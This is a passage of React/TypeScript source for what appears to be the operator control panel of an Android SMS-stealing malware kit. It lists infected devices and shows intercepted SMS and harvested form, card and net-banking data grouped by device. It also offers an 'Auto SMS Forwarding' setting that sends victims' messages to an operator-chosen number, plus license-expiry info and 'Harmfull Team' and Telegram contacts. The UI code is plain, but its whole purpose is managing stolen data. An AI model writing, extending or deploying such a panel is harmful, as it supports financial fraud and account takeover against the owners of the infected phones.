      setGlobalEnabled(!!ph);
    } catch {}
  }

  async function saveGlobalPhone() {
    setGlobalLoading(true); setGlobalMsg("");
    try {
      await axios.put(`${ENV.API_BASE}/api/admin/globalPhone`, { phone: globalEnabled ? globalPhone : "" }, { headers: apiHeaders() });
      setGlobalMsg(globalEnabled ? "✅ Saved!" : "✅ Cleared!");
      if (!globalEnabled) setGlobalPhone("");
    } catch { setGlobalMsg("❌ Failed"); }
    finally { setGlobalLoading(false); }
  }

  async function changePin() {
    setPinMsg("");
    if (!pinOld || !pinNew) { setPinMsg("❌ All fields required"); return; }
    if (pinNew !== pinConfirm) { setPinMsg("❌ PINs don't match"); return; }
    if (pinNew.length < 4) { setPinMsg("❌ Min 4 digits"); return; }
    try {
      const r = await axios.post(`${ENV.API_BASE}/api/admin/deletePassword/change`,
        { currentPassword: pinOld, newPassword: pinNew }, { headers: apiHeaders() });
      if (r.data?.success) { setPinMsg("✅ PIN changed!"); setPinOld(""); setPinNew(""); setPinConfirm(""); }
      else { setPinMsg("❌ " + (r.data?.error || "Failed")); }
    } catch (e: any) { setPinMsg("❌ " + (e?.response?.data?.error || "Failed")); }
  }

  async function loadLicenseInfo() {
    try {
      const r = await fetch(`${ENV.API_BASE}/api/admin/license-info`, { headers: apiHeaders() });
      if (r.ok) setLicenseInfo(await r.json());
    } catch {}
  }

  function handleTabChange(tab: TabKey) { if (tab === "help") { setHelpOpen(true); return; } setActiveTab(tab); setSearch(""); }

  const SORT_OPTS   = [{ value: "new", label: "NEW" }, { value: "old", label: "OLD" }];
  const DEVICE_OPTS = [{ value: "latest", label: "Latest" }, { value: "old2new", label: "Old 2 New" }];
  const isLoading   = loadingForms || loadingSms;

  return (
    <div className={`min-h-screen ${D.page(dark)}`}>
      <TopNav
        activeTab={activeTab}
        onTabChange={handleTabChange}
        darkMode={dark}
        onToggleDark={() => setDark((d) => !d)}
        alertText={alertText}
      />

      {activeTab !== "devices" && activeTab !== "help" && (
        <SearchBar value={search} onChange={setSearch}
          filter={sortMode} onFilter={(v) => setSortMode(v as SortMode)}
          options={SORT_OPTS} dark={dark} />
      )}

      {/* HOME — forms + SMS newest first */}
      {activeTab === "home" && (
        <div className="space-y-3 px-3 pb-24 pt-1">
          {isLoading
            ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
            : filterQ(mixedFeed).length === 0
              ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data yet.</div>
              : filterQ(mixedFeed).map((item, i) =>
                  item._type === "form"
                    ? <FormCard key={getId(item) || i} form={item} onDeviceClick={(id) => openDevice(id, "home")} dark={dark} />
                    : <SmsCard  key={getId(item) || i} sms={item}  onDeviceClick={(id) => openDevice(id, "messages")} dark={dark} pageNum={smsPageMap[getId(item)]} />
                )
          }
        </div>
      )}

      {/* DATA — forms + cards + net newest first */}
      {activeTab === "data" && (
        <div className="space-y-3 px-3 pb-24 pt-1">
          {isLoading || loadingGroups
            ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
            : filterQ(allDataItems).length === 0
              ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data.</div>
              : filterQ(allDataItems).map((item, i) =>
                  <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} />
                )
          }
        </div>
      )}

      {/* MESSAGES */}
      {activeTab === "messages" && (
        <div className="space-y-3 px-3 pb-24 pt-1">
          {loadingSms
            ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
            : filterQ([...allSms].sort((a, b) => sortByTime(a, b, sortMode))).length === 0
              ? <div className={`py-10 text-center ${D.empty(dark)}`}>No messages.</div>
              : filterQ([...allSms].sort((a, b) => sortByTime(a, b, sortMode))).map((m, i) =>
                  <SmsCard key={getId(m) || i} sms={m} onDeviceClick={(id) => openDevice(id, "messages")} dark={dark} pageNum={smsPageMap[getId(m)]} />
                )
          }
        </div>
      )}

      {/* GROUPS */}
      {activeTab === "groups" && (
        <div className="space-y-3 px-3 pb-24 pt-1">
          {loadingForms || loadingGroups
            ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
            : filterQ(groups).length === 0
              ? <div className={`py-10 text-center ${D.empty(dark)}`}>No grouped data.</div>
              : filterQ(groups).map((g) =>
                  <GroupCard key={g.deviceId} deviceId={g.deviceId} items={g.items} onDeviceClick={openDevice} dark={dark} />
                )
          }
        </div>
      )}

      {/* DEVICES */}
      {activeTab === "devices" && (
        <div className="pb-24">
          <SearchBar value={search} onChange={setSearch}
            filter={deviceSort} onFilter={(v) => setDeviceSort(v as DeviceSortMode)}
            options={DEVICE_OPTS} dark={dark} />
          {loadingDevices
            ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
            : filterQ(sortedDevices).length === 0
              ? <div className={`py-10 text-center ${D.empty(dark)}`}>No devices.</div>
              : <div className="grid grid-cols-2 gap-3 px-3 pt-1">
                  {filterQ(sortedDevices).map((d, i) => (
                    <DeviceCard key={str(d.deviceId) || i} device={d}
                      displayNum={filterQ(sortedDevices).length - i}
                      onCheckOnline={handleCheckOnline}
                      onOpen={(id) => openDevice(id, 'devices')}
                      recentlyOnline={!!recentlyOnlineMap[str(d.deviceId)]}
                      dark={dark}
                    />
                  ))}
                </div>
          }
        </div>
      )}

      {/* HELP — bottom sheet modal */}
      {helpOpen && (
        <div className="fixed inset-0 z-[1000] flex items-end bg-black/60"
          onClick={() => setHelpOpen(false)}>
          <div className="w-full rounded-t-2xl bg-[#1c1c1c] px-5 pt-5 pb-8"
            onClick={e => e.stopPropagation()}>
            {/* Header */}
            <div className="mb-4 flex items-center justify-between">
              <span className="text-[18px] font-bold text-white">Help</span>
              <button type="button" onClick={() => setHelpOpen(false)}
                className="h-7 w-7 rounded-lg border border-gray-600 text-gray-400 flex items-center justify-center text-[14px]">✕</button>
            </div>

            {/* Links */}
            <div className="mb-5 divide-y divide-gray-700 border-t border-gray-700">
              {[
                { label: "APK Info", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } },
                { label: "Settings", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadGlobalPhone(); } },
                { label: "Logout",   onClick: handleLogout },
              ].map(item => (
                <button key={item.label} type="button" onClick={item.onClick}
                  className="flex w-full items-center justify-between py-3 text-[15px] text-gray-200">
                  <span>{item.label}</span>
                  <span className="text-gray-500">›</span>
                </button>
              ))}
            </div>

            {/* Contact buttons */}
            <div className="space-y-2">
              <button type="button" onClick={() => setContactOpen(true)}
                className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-semibold text-green-400">
                Contact Us
              </button>
              <button type="button" onClick={openTelegramHelp}
                className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-semibold text-blue-400">
                Telegram Channel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Contact Us popup */}
      {contactOpen && (
        <div className="fixed inset-0 z-[1001] flex items-end justify-center bg-black/40"
          onClick={() => setContactOpen(false)}>
          <div className="w-full rounded-t-2xl bg-white px-5 pt-5 pb-8"
            onClick={e => e.stopPropagation()}>
            <div className="mb-4 text-center text-[15px] font-extrabold text-gray-900">Contact Us</div>
            <div className="space-y-3">
              <button type="button" onClick={() => { setContactOpen(false); openWhatsApp(); }}
                className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-extrabold text-green-600">
                WhatsApp
              </button>
              <button type="button" onClick={() => { setContactOpen(false); openTelegramTarget(); }}
                className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-extrabold text-blue-600">
                Telegram
              </button>
              <button type="button" onClick={() => { setContactOpen(false); openHarmfullContact(); }}
                className="w-full rounded-xl border-2 border-amber-500 py-3 text-[14px] font-extrabold text-amber-600">
                Contact Harmfull Team
              </button>
            </div>
          </div>
        </div>
      )}

      {/* SETTINGS SCREEN */}
      {helpScreen === "settings" && (
        <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f5f5f5]">
          {/* Header */}
          <div className="sticky top-0 flex items-center gap-3 bg-white px-4 py-3 shadow-sm">
            <button type="button" onClick={() => setHelpScreen("")}
              className="text-[20px] text-gray-600">←</button>
            <span className="text-[17px] font-bold text-gray-900">Settings</span>
          </div>

          <div className="mx-auto max-w-[480px] space-y-4 p-4">
            {/* Auto SMS Forwarding */}
            <div className="rounded-2xl bg-white p-5 shadow-sm">
              <div className="mb-4 text-[15px] font-bold text-gray-900">Auto SMS Forwarding</div>

              {/* ON/OFF toggle */}
              <div className="mb-4 flex items-center justify-between">
                <span className="text-[14px] text-gray-600">Forward Status</span>
                <button type="button"
                  onClick={() => { setGlobalEnabled(v => !v); setGlobalMsg(""); }}
                  className={[
                    "relative h-7 w-12 rounded-full transition-colors",
                    globalEnabled ? "bg-green-500" : "bg-gray-300"
                  ].join(" ")}>
                  <span className={[
                    "absolute top-0.5 h-6 w-6 rounded-full bg-white shadow transition-transform",
                    globalEnabled ? "translate-x-5" : "translate-x-0.5"
                  ].join(" ")} />
                </button>
              </div>

              {/* Number input — always visible */}
              <div className="mb-1 text-[12px] font-semibold text-gray-500">Forward Number:</div>
              <input
                value={globalPhone}
                onChange={e => setGlobalPhone(e.target.value)}
                placeholder="Enter phone number"
                inputMode="tel"
                className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400"
              />

              <button type="button" onClick={saveGlobalPhone} disabled={globalLoading}
                className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-60">
                {globalLoading ? "Saving…" : "Save"}
              </button>
              {globalMsg && <div className="mt-2 text-center text-[13px]">{globalMsg}</div>}
            </div>

            {/* Change PIN */}
            <div className="rounded-2xl bg-white p-5 shadow-sm">
              <div className="mb-4 text-[15px] font-bold text-gray-900">Change PIN</div>
              {[
                { label: "Old PIN",     val: pinOld,    set: setPinOld },
                { label: "New PIN",     val: pinNew,    set: setPinNew },
                { label: "Confirm PIN", val: pinConfirm, set: setPinConfirm },
              ].map(f => (
                <div key={f.label} className="mb-3">
                  <div className="mb-1 text-[12px] font-semibold text-gray-500">{f.label}</div>
                  <input type="password" inputMode="numeric" value={f.val}
                    onChange={e => f.set(e.target.value)}
                    className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
                </div>
              ))}
              <button type="button" onClick={changePin}
                className="mt-2 w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white">
                Change PIN
              </button>
              {pinMsg && <div className="mt-2 text-center text-[13px]">{pinMsg}</div>}
            </div>
          </div>
        </div>
      )}

      {/* APK INFO SCREEN */}
      {helpScreen === "apk" && (
        <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f5f5f5]">
          {/* Header */}
          <div className="sticky top-0 flex items-center gap-3 bg-white px-4 py-3 shadow-sm">
            <button type="button" onClick={() => setHelpScreen("")}
              className="text-[20px] text-gray-600">←</button>
            <span className="text-[17px] font-bold text-gray-900">APK Info</span>
          </div>

          <div className="mx-auto max-w-[480px] space-y-4 p-4">
            <div className="rounded-2xl bg-white p-5 shadow-sm space-y-4">
              {[
                { label: "Panel ID",      value: str(ENV.PANEL_ID || "-") },
                { label: "Version",       value: str(ENV.VERSION || "v1.0") },
                { label: "Expiry Date",   value: licenseInfo?.expiryDate || "—" },
                { label: "Status",        value: licenseInfo?.status || "Active" },
                { label: "Contact (TG)",  value: str(ENV.TELEGRAM_CHANNEL || "-") },
              ].map(row => (
                <div key={row.label}>
                  <div className="text-[12px] font-semibold text-gray-500">{row.label}</div>
                  <div className="mt-0.5 break-all text-[14px] font-semibold text-gray-900">{row.value}</div>
                </div>
              ))}
            </div>

            <button type="button" onClick={openTelegramHelp}
              className="w-full rounded-xl border-2 border-blue-500 py-3 text-[15px] font-semibold text-blue-600">
              Join Telegram Channel
            </button>
          </div>
        </div>
      )}

      {/* Refresh FAB */}
      <button type="button" onClick={loadAll}
        className="fixed bottom-6 right-4 z-40 flex h-12 w-12 items-center justify-center rounded-full bg-black text-white shadow-lg text-[20px] hover:bg-gray-800"
        title="Refresh">↻</button>

      {checkAlert && <CheckAlert status={checkAlert.status} onClose={closeCheckAlert} />}
    </div>
  );
}
